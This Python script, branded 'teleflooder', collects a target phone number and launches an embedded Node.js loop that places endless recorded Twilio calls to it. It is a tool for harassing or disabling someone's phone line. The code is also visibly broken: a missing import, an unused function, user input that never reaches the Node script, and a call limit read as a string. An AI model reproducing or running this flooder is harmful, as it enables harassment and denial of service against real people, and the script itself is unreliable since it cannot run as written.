import os
import threading
import time
import subprocess

## Makes a call with Twilio to the target number using the source number
def make_call(target, source):
    try:
        call = client.calls.create(
            record=True,
            to=target,
            from_=source,
            url="https://handler.twilio.com/twiml/EH83ede6e13d3f59c05a260b6b72dc407f"
        )
        print(f"Call placed to {target} from {source}")
    except Exception as e:
        print(f"Failed to make call to {target}. Error: {str(e)}")

## Twilio SID and Auth token. Store these as environment vars for security.
account_sid = os.getenv("TWILIO_ACCOUNT_SID")
auth_token = os.getenv("TWILIO_AUTH_TOKEN")

## Check if the required environment variables are set
if not account_sid or not auth_token:
    print("Please set TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN environment variables.")
    exit(1)

## Create a new Client object for authentication to Twilio
client = Client(account_sid, auth_token)

phonelogo = '''
#################################################################
##                                                             ##
##                                                             ##
##           ####                                              ##
##         #########           * * * teleflooder * * *         ##
##       #####  ######                                         ##
##     #####       #####                                       ##
##   #####          ######                                     ##
##   ####             ######                                   ##
##  ####                #####                                  ##
##  ####                  ####                                 ##
##  ####                 ####                                  ##
##   ####              #####                                   ##
##   ####            #####                                     ##
##    ####         #####                                       ##
##     ####        #####         Licensed under GNU GPLv3      ##
##     #####        #####                                      ##
##       ####         #####                                    ##
##        ####          #####                                  ##
##         #####         ######              ####              ##
##          #####          ######          #########           ##
##            #####          ######      #####  ######         ##
##             ######           ###### #####       #####       ##
##               ######           ########           #####     ##
##                 ######            ###               #####   ##
##                   ######                              ####  ##
##                     #######                            ###  ##
##                       #######                        ####   ##
##                          #######                   #####    ##
##                              #########            #####     ##
##                                #####################        ##
##                                     ##############          ##
##                                                             ##
##                                                             ##
#################################################################
'''

print(phonelogo)

## Input your Twilio number (coming soon: multiple numbers)
mynumber = input("What is your Twilio number? ")

## Input the number of your target
badnumber = input("What is the number you want to flood? ")

## Accept user input to run the flooder
input("Press ENTER to run the flooder...")

# Writing the JavaScript code to a temporary file
node_script = '''
require('dotenv').config()

const client = new require('twilio')(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);

// Set this to 0 for infinite
const max = process.env.MAX_CALLS || 0;

// Don't change this
let count = 1;

console.info(`:: Flooding [ ${process.env.TARGET_PHONE_NUMBER} ] from [ ${process.env.SOURCE_PHONE_NUMBER} ]`);
console.info(`:: Starting flood of ${max} calls`);

// Call finish method when necessary
placeCall().then(finished).catch(console.error);
process.on('SIGINT', finished);

function placeCall() {
	return new Promise((resolve, reject) =>
		client.calls.create({ record: true, url: process.env.TWIML_URL, to: process.env.TARGET_PHONE_NUMBER, from: process.env.SOURCE_PHONE_NUMBER, /* sendDigits: (true) ? '1' : null  */ })
			.then((call) => {
				console.info(`:: Call ${count++} placed with ID [ ${call.sid.substring(0, 8) + '...' + call.sid.substring(call.sid.length - 8)} ]`);
				count < max + 1 || max === 0 ? placeCall().then(resolve).catch(reject) : resolve();
			})
			.catch(reject));
}

function finished() {
	console.info(`:: Finished flood of ${count - 1} calls`);
	process.exit(0);
}
'''

with open('temp_script.js', 'w') as file:
    file.write(node_script)

# Command to execute the JavaScript file using Node.js
command = ['node', 'temp_script.js']

# Running the Node.js script as a subprocess
try:
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(stdout.decode('utf-8'))
    print(stderr.decode('utf-8'))
except Exception as e:
    print(f"An error occurred: {str(e)}")
finally:
    # Deleting the temporary JavaScript file
    os.remove('temp_script.js')
